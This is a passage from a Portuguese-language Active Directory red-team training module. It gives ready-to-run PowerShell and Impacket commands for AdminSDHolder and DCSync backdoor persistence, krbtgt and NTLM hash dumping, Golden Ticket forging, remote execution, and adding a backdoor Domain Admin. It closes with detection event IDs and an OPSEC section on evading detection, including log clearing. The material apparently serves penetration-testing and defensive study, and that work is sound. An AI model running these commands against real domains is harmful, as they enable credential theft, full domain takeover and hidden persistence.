    Where-Object { $_.SecurityIdentifier -match "backdoor_user_SID" }

# ================================================================
# Explorar o acesso após propagação:
# backdoor_user agora tem controle sobre Domain Admins, Enterprise Admins, etc.

# Adicionar backdoor_user como Domain Admin
$cred = New-Object PSCredential("corp\backdoor_user", (ConvertTo-SecureString "BackdoorPass" -AsPlainText -Force))
Invoke-Command -ComputerName DC01.corp.local -Credential $cred -ScriptBlock {
    Add-ADGroupMember -Identity "Domain Admins" -Members "backdoor_user"
}

# Ou via net (se tem permissão de escrita no grupo):
net group "Domain Admins" backdoor_user /add /domain

# ================================================================
# Limpeza (remover ACE do AdminSDHolder — se necessário para stealth)
Remove-DomainObjectAcl \
    -TargetIdentity "CN=AdminSDHolder,CN=System,DC=corp,DC=local" \
    -PrincipalIdentity "backdoor_user" \
    -Rights All

# ================================================================
# Contas protegidas pelo AdminSDHolder (alvo da propagação):
# Domain Admins, Enterprise Admins, Schema Admins, Administrators,
# Account Operators, Backup Operators, Print Operators, Server Operators,
# Replicator, krbtgt, Domain Controllers, Read-Only Domain Controllers,
# Group Policy Creator Owners
# E membros transitivos desses grupos

# Verificar quais contas têm adminCount=1 (foram processadas pelo SDProp):
Get-DomainUser -AdminCount -Properties samaccountname,admincount,memberof |
    Select-Object samaccountname, admincount
Get-DomainComputer -AdminCount -Properties dnshostname,admincount
```

---

### Adicionar Conta com Permissões DCSync Diretamente

```powershell
# Alternativa ao AdminSDHolder — adicionar permissões de DCSync diretamente
# no objeto raiz do domínio para uma conta backdoor

# Via PowerView
Add-DomainObjectAcl \
    -TargetIdentity "DC=corp,DC=local" \
    -PrincipalIdentity "backdoor_user" \
    -Rights DCSync

# Verificar que foi adicionado
Get-DomainObjectAcl -Identity "DC=corp,DC=local" -ResolveGUIDs |
    Where-Object { $_.ObjectAceType -match "DS-Replication" } |
    Where-Object { $_.SecurityIdentifier -match "backdoor" }

# Via ADSI nativo (sem PowerView)
$domainDN = "DC=corp,DC=local"
$backupuserSID = (Get-ADUser backdoor_user).SID
$ace1 = New-Object System.DirectoryServices.ActiveDirectoryAccessRule(
    $backupuserSID,
    [System.DirectoryServices.ActiveDirectoryRights]::ExtendedRight,
    [System.Security.AccessControl.AccessControlType]::Allow,
    [GUID]"1131f6aa-9c07-11d1-f79f-00c04fc2dcd2"  # DS-Replication-Get-Changes
)
$ace2 = New-Object System.DirectoryServices.ActiveDirectoryAccessRule(
    $backupuserSID,
    [System.DirectoryServices.ActiveDirectoryRights]::ExtendedRight,
    [System.Security.AccessControl.AccessControlType]::Allow,
    [GUID]"1131f6ad-9c07-11d1-f79f-00c04fc2dcd2"  # DS-Replication-Get-Changes-All
)
$domainObj = [ADSI]"LDAP://$domainDN"
$domainObj.ObjectSecurity.AddAccessRule($ace1)
$domainObj.ObjectSecurity.AddAccessRule($ace2)
$domainObj.CommitChanges()

# Testar DCSync com a conta backdoor (após adicionar permissões)
secretsdump.py corp.local/backdoor_user:BackdoorPass@DC01.corp.local -just-dc-ntlm
```

---

### Workflow Completo de Dominância de Domínio

```bash
# ===== FASE 1: OBTER HASH DO KRBTGT =====

# Linux
secretsdump.py corp.local/Administrator:Pass@DC01.corp.local \
    -just-dc-user krbtgt \
    | tee /tmp/krbtgt_dump.txt

# Extrair hash
grep "krbtgt" /tmp/krbtgt_dump.txt | cut -d: -f4

# ===== FASE 2: DUMP COMPLETO =====
secretsdump.py corp.local/Administrator:Pass@DC01.corp.local \
    -just-dc-ntlm \
    -outputfile /tmp/domain_dump

# ===== FASE 3: CRIAR GOLDEN TICKET =====
ticketer.py \
    -nthash KRBTGT_NTLM_HASH \
    -domain-sid S-1-5-21-XXXX-XXXX-XXXX \
    -domain corp.local \
    -groups 512,513,518,519,520 \
    -duration 365 \
    Administrator

export KRB5CCNAME=/tmp/Administrator.ccache

# ===== FASE 4: VERIFICAR DOMINÂNCIA =====
# Testar acesso a DC via Golden Ticket
smbclient //DC01.corp.local/C$ -k --no-pass -c "ls"

# Executar remotamente
wmiexec.py -k -no-pass corp.local/Administrator@DC01.corp.local \
    "whoami && net group 'Domain Admins' /domain"

# ===== FASE 5: PERSISTÊNCIA =====
# Adicionar conta backdoor como DA
wmiexec.py -k -no-pass corp.local/Administrator@DC01.corp.local \
    "net user backdoor BackdoorP@ss123! /add /domain && net group 'Domain Admins' backdoor /add /domain"

# Adicionar permissões DCSync para backdoor
psexec.py -k -no-pass corp.local/Administrator@DC01.corp.local
# No shell remoto:
# powershell -c "Add-DomainObjectAcl -TargetIdentity 'DC=corp,DC=local' -PrincipalIdentity backdoor -Rights DCSync"
```

---

## Detecção e OPSEC

### Detecção de DCSync

**Event ID 4662 — Operation performed on an object** (no DC):
```
Object Type: %{19195a5b-6da0-492b-bc6e-e97d2d2c89a0}  # domainDNS
Properties: {1131f6aa-...}  (DS-Replication-Get-Changes)
           {1131f6ad-...}  (DS-Replication-Get-Changes-All)
Account Name: [conta que executou DCSync]
Account Domain: CORP
Logon ID: [session ID]
```

Indicadores suspeitos no 4662:
- A conta não é um computador (DCs são contas de computador)
- A conta não é membro de Domain Admins ou Enterprise Admins
- Horário incomum ou frequência incomum
- IP de origem que não é um DC

**Microsoft Defender for Identity**: detecta DCSync especificamente — alerta "Directory Services Replication" quando uma conta não-DC solicita replicação.

**Correlação de eventos**:
```
4662 (access to object with DS-Replication rights)
→ seguido por múltiplos 4662 com diferentes GUIDs de atributos
→ da mesma conta em curto intervalo
= padrão de DCSync
```

### Detecção de NTDS.dit Dump

```
# VSS Shadow Copy:
Event ID 8222 — VSS shadow copy created
Event ID 4673 — Privilege use (SeBackupPrivilege, SeRestorePrivilege)
Processo: vssadmin.exe, wmic.exe, PowerShell

# ntdsutil:
Event ID 325 — Database was restored (quando IFM é criado)
Process creation: ntdsutil.exe com argumentos "ifm"
Sysmon Event ID 1: process create ntdsutil.exe

# Sysmon (se configurado):
Event ID 11: File create — ntds.dit em path inesperado
Event ID 10: Process access — LSASS access
```

### Detecção de Skeleton Key

```
# Event ID 4611 — Trusted logon process has registered (quando DLL é injetada)
# Event ID 4673 — Sensitive privilege use (Debug privilege)
# Event ID 7045 — New service installed (em algumas versões)

# Sysmon Event ID 8 — CreateRemoteThread no LSASS
# Sysmon Event ID 10 — Process accessed (lsass.exe sendo acessado pelo mimikatz)

# Detecção comportamental:
# - Autenticação bem-sucedida com senha incorreta (Skeleton Key password)
# - DLL não assinada carregada no LSASS
# - Processo não confiável acessando LSASS memory
```

### Detecção de AdminSDHolder Abuse

```
# Event ID 4662 — Write to AdminSDHolder object
# Object: CN=AdminSDHolder,CN=System,DC=domain,DC=com
# Access: Write Property / WriteDACL

# Após SDProp executar:
# Event ID 4670 — Permissions on object changed
# Para objetos como "Domain Admins", "Enterprise Admins"
# Changed by: SYSTEM (o SDProp roda como SYSTEM)
# Mas a mudança veio do AdminSDHolder modificado pelo atacante
```

### OPSEC — Reduzindo Detecção no DCSync

```bash
# RUIM — dump de todos os hashes de uma vez (muito tráfego, detectável)
secretsdump.py corp.local/user:pass@DC01.corp.local

# MELHOR — dump apenas das contas necessárias
secretsdump.py corp.local/user:pass@DC01.corp.local -just-dc-user krbtgt
secretsdump.py corp.local/user:pass@DC01.corp.local -just-dc-user Administrator

# MELHOR — executar em horário de business hours (se mistura com tráfego normal)
# Replicações AD ocorrem constantemente — DCSync durante horário de pico se mistura melhor

# Usar conta de serviço legítima que já tem DS-Replication rights
# (ex: conta do Azure AD Connect) — menos suspeito que Administrator

# Após DCSync, criar Golden Ticket e usar em vez de continuar com as credenciais
# (reduz uso das credenciais obtidas e sua detecção)

# Limpar logs do sistema (apenas se extremamente necessário — ação destrutiva)
# Remover evento 4662 não é trivial sem modificar o EVTX diretamente
```

---

## Módulos Relacionados

`03_golden_e_silver_tickets.md` é o próximo passo natural — krbtgt hash obtido aqui alimenta Golden Ticket. `02_kerberoasting_e_asrep.md` cobre service accounts identificados que podem ter DCSync rights. `08_bloodhound_e_enumeracao.md` mostra o edge DCSync no grafo. `05_delegacao_unconstrained.md` aprofunda Unconstrained Delegation que pode levar a DCSync via TGT capturado. `09_dacl_attacks.md` cobre DCSync rights adicionados via WriteDACL no domain object. MITRE ATT&CK: T1003.006 (DCSync), T1003.003 (NTDS), T1098 (Account Manipulation).

---

## Leitura Complementar

- harmj0y — "An ACE up the Sleeve" — https://www.harmj0y.net/blog/activedirectory/
- Sean Metcalf — "Active Directory Security — DCSync" — https://adsecurity.org/?p=1729
- MS-DRSR Protocol Specification — https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-drsr
- DSInternals PowerShell Module — https://github.com/MichaelGrafnetter/DSInternals
- Impacket secretsdump — https://github.com/fortra/impacket
- "AdminSDHolder Abuse" — https://adsecurity.org/?p=573
